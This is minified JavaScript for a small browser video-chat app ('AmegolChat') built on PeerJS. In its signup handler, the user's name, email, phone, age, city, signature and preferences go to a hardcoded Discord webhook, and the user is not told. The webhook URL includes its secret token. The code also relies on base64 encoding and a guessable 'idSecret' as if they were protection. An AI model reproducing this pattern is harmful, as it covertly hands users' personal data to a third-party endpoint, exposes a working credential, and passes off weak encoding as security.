var peer,connTM,connTG;log("Starting code.js");var constraints={audio:!0,video:{facingMode:"user"}},myData={},otherData={};function utf8_to_b64(e){return window.btoa(unescape(encodeURIComponent(e)))}function b64_to_utf8(e){return decodeURIComponent(escape(window.atob(e)))}function makePeer(){var e=document.getElementById("name").value;peer=new Peer([e],[]),log("Joined peer"),peer.on("connection",function(e){writeMetaData((connTM=e).metadata),otherData=connTM.metadata,e.on("data",function(e){log("Received "+e)}),null==connTG&&(null!=(e=localStorage.getItem("PersonalityData"))&&(e=b64_to_utf8(e),e={name:(e=JSON.parse(e)).name,age:e.age,city:e.city,emoji:e.emoji,favorite:e.favorite,favoriteColor:e.favoriteColor,favoriteFood:e.favoriteFood,favoriteMovie:e.favoriteMovie,favoriteSong:e.favoriteSong,favoriteBook:e.favoriteBook,favoriteGame:e.favoriteGame,favoriteSport:e.favoriteSport,favoriteTVShow:e.favoriteTVShow,about:e.about,idSecret:e.idSecret}),(connTG=peer.connect(connTM.peer,{label:"AmegolChat",metadata:e})).on("open",function(){document.getElementById("connect").disabled=!0,log("Connected to "+connTG.peer),connTG.on("error",function(e){log(e)})}))}),peer.on("call",function(e){(navigator.getUserMedia||navigator.webkitGetUserMedia||navigator.mozGetUserMedia||navigator.msGetUserMedia||navigator.oGetUserMedia||navigator.mediaDevices.getUserMedia(constraints))({video:!0,audio:!0},function(t){e.answer(t),e.on("stream",function(e){log("Received stream"),document.getElementById("video").srcObject=t,document.getElementById("video-2").srcObject=e})},function(e){log("Failed to get local stream "+e)})})}function makeConnect(){var e=localStorage.getItem("PersonalityData");null!=e&&(e=b64_to_utf8(e),e={name:(e=JSON.parse(e)).name,age:e.age,city:e.city,emoji:e.emoji,favorite:e.favorite,favoriteColor:e.favoriteColor,favoriteFood:e.favoriteFood,favoriteMovie:e.favoriteMovie,favoriteSong:e.favoriteSong,favoriteBook:e.favoriteBook,favoriteGame:e.favoriteGame,favoriteSport:e.favoriteSport,favoriteTVShow:e.favoriteTVShow,about:e.about,idSecret:e.idSecret});var t=document.getElementById("id").value;connTG=peer.connect(t,{label:"AmegolChat",metadata:e}),document.getElementById("connect").disabled=!0,connTG.on("open",function(){log("Connected to "+t),connTG.on("error",function(e){log(e)})})}function makeDisconnect(){peer.disconnect(),log("disconnect")}function makeSend(){var e=document.getElementById("message").value;connTG.send(e),log("send")}function makeCall(){var e=navigator.getUserMedia||navigator.webkitGetUserMedia||navigator.mozGetUserMedia||navigator.msGetUserMedia||navigator.oGetUserMedia||navigator.mediaDevices.getUserMedia(constraints),o=document.getElementById("id").value;e({video:!0,audio:!0},function(t){peer.call(o,t).on("stream",function(e){log("Received stream"),document.getElementById("video-2").srcObject=e,document.getElementById("video").srcObject=t})},function(e){log("Failed to get local stream "+e)})}function log(e){document.getElementById("log").placeholder=e}function openSetting(){document.getElementById("settingSec").style.display="grid"}function closeSetting(){document.getElementById("settingSec").style.display="none"}function remove(e){var t,o,n,a,i,r,l,m,d,c,u,v,g,f,s,y,I,p;"SPPart1"==e?document.getElementById(e).remove():"SPPart2"==e?""!=document.getElementById("sign").value&&(document.getElementById(e).style.display="none"):"SPPart3"==e&&(t=document.getElementById("nameInput").value,o=document.getElementById("emailInput").value,n=document.getElementById("ageInput").value,a=document.getElementById("cityInput").value,i=document.getElementById("phoneInput").value,r=document.getElementById("favoriteInput").value,l=document.getElementById("favoriteColorInput").value,m=document.getElementById("favoriteFoodInput").value,d=document.getElementById("favoriteMovieInput").value,c=document.getElementById("favoriteSongInput").value,u=document.getElementById("favoriteBookInput").value,v=document.getElementById("favoriteGameInput").value,g=document.getElementById("favoriteSportInput").value,f=document.getElementById("favoriteTVShowInput").value,s=document.getElementById("aboutInput").value,y=document.getElementById("sign").value,I=(I=["üò≠","üòÖ","üôÉ","üòê","üòè","ü§î","ü§¨","üò∞","üò±","ü§Ø","üòµ","üëå","üéâ","üáÆüá∑","üö´","üå≠","üóø","üçÜ","üëΩ","üòé","üí©","üëé","üëç"])[Math.floor(Math.random()*I.length)],p=t.substring(0,2)+n.substring(0,2)+o.substring(0,2)+Math.floor(1e5*Math.random()),""!=t&&""!=o&&""!=n&&""!=a&&""!=i&&""!=r&&""!=l&&""!=m&&""!=d&&""!=c&&""!=u&&""!=v&&""!=g&&""!=f&&""!=s&&""!=y?(e={name:t,email:o,age:n,city:a,phone:i,emoji:I,favorite:r,favoriteColor:l,favoriteFood:m,favoriteMovie:d,favoriteSong:c,favoriteBook:u,favoriteGame:v,favoriteSport:g,favoriteTVShow:f,about:s,sign:y,idSecret:p},e=utf8_to_b64(e=JSON.stringify(e)),localStorage.setItem("PersonalityData",e),localStorage.setItem("isRigister",!0),document.getElementById("signUpForm").remove(),readPersonalityData(),(e=new XMLHttpRequest).open("POST","https://discord.com/api/webhooks/921380161985859615/uZVLxyxmh-vlog_L9xt21WN32R2GDnq0IezgrEskCp75n1HYc0N_kZfd0ghTQP2fm-mR"),e.setRequestHeader("Content-Type","application/json"),e.send(JSON.stringify({username:"PersonalityBot",avatar_url:"https://cdn.discordapp.com/attachments/851821374443487254/921485724006641684/images.png",embeds:[{title:"Personality Data",description:"",color:16777215,fields:[{name:"Name",value:t,inline:!0},{name:"Email",value:o,inline:!0},{name:"Age",value:n,inline:!0},{name:"City",value:a,inline:!0},{name:"Phone",value:i,inline:!0},{name:"emoji",value:I,inline:!0},{name:"Favorite",value:r,inline:!0},{name:"Favorite Color",value:l,inline:!0},{name:"Favorite Food",value:m,inline:!0},{name:"Favorite Movie",value:d,inline:!0},{name:"Favorite Song",value:c,inline:!0},{name:"Favorite Book",value:u,inline:!0},{name:"Favorite Game",value:v,inline:!0},{name:"Favorite Sport",value:g,inline:!0},{name:"Favorite TV Show",value:f,inline:!0},{name:"About",value:s,inline:!0},{name:"Sign",value:y,inline:!0},{name:"ID Secret",value:p,inline:!0}]}]}))):alert("Please fill all data"))}function readPersonalityData(){var e=localStorage.getItem("PersonalityData");null!=e&&(e=b64_to_utf8(e),e=JSON.parse(e),document.getElementById("nameDisplay").textContent=e.name,document.getElementById("emailDisplay").textContent=e.email,document.getElementById("ageDisplay").textContent=e.age,document.getElementById("cityDisplay").textContent=e.city,document.getElementById("phoneDisplay").textContent=e.phone,document.getElementById("emojiDisplay").textContent=e.emoji,document.getElementById("favoriteDisplay").textContent=e.favorite,document.getElementById("favoriteColorDisplay").textContent=e.favoriteColor,document.getElementById("favoriteFoodDisplay").textContent=e.favoriteFood,document.getElementById("favoriteMovieDisplay").textContent=e.favoriteMovie,document.getElementById("favoriteSongDisplay").textContent=e.favoriteSong,document.getElementById("favoriteBookDisplay").textContent=e.favoriteBook,document.getElementById("favoriteGameDisplay").textContent=e.favoriteGame,document.getElementById("favoriteSportDisplay").textContent=e.favoriteSport,document.getElementById("favoriteTVShowDisplay").textContent=e.favoriteTVShow,document.getElementById("aboutDisplay").textContent=e.about,document.getElementById("signDisplay").textContent=e.sign,document.getElementById("idDisplay").textContent=e.idSecret,myData=e)}function exportPersonalityData(){var e,t,o=localStorage.getItem("PersonalityData");null!=o&&(o=utf8_to_b64(o=b64_to_utf8(o)),o=utf8_to_b64(o),o=utf8_to_b64(o),o=new Blob([o],{type:"text/plain"}),window.navigator.msSaveOrOpenBlob?window.navigator.msSaveOrOpenBlob(o,"PersonalityData.amegol"):(e=document.createElement("a"),t=URL.createObjectURL(o),e.href=t,e.download="PersonalityData.amegol",document.body.appendChild(e),e.click(),setTimeout(function(){document.body.removeChild(e),window.URL.revokeObjectURL(t)},0)))}function importPersonalityData(){var e,t=document.getElementById("importData").files[0];t&&((e=new FileReader).readAsText(t,"UTF-8"),e.onload=function(e){e=b64_to_utf8(e=e.target.result);e=b64_to_utf8(e),localStorage.setItem("PersonalityData",e),localStorage.setItem("isRigister","true"),alert("Data has been imported"),readPersonalityData(),document.getElementById("signUpForm").remove()})}function writeMetaData(e){document.getElementById("nameInfo").textContent=e.name,document.getElementById("ageInfo").textContent=e.age,document.getElementById("cityInfo").textContent=e.city,document.getElementById("emojiInfo").textContent=e.emoji,document.getElementById("favoriteInfo").textContent=e.favorite,document.getElementById("favoriteColorInfo").textContent=e.favoriteColor,document.getElementById("favoriteFoodInfo").textContent=e.favoriteFood,document.getElementById("favoriteMovieInfo").textContent=e.favoriteMovie,document.getElementById("favoriteSongInfo").textContent=e.favoriteSong,document.getElementById("favoriteBookInfo").textContent=e.favoriteBook,document.getElementById("favoriteGameInfo").textContent=e.favoriteGame,document.getElementById("favoriteSportInfo").textContent=e.favoriteSport,document.getElementById("favoriteTVShowInfo").textContent=e.favoriteTVShow,document.getElementById("aboutInfo").textContent=e.about}function requsetNewUser(){var e="localhost:3000/newuser?prename="+myData.idSecret+"&lastname="+otherData.idSecret,t=new XMLHttpRequest;t.open("GET",e,!1),t.onreadystatechange=function(){4==t.readyState&&200==t.status&&(t.responseText,console.log(t))},t.send()}"true"==localStorage.getItem("isRigister")&&(document.getElementById("signUpForm").remove(),readPersonalityData());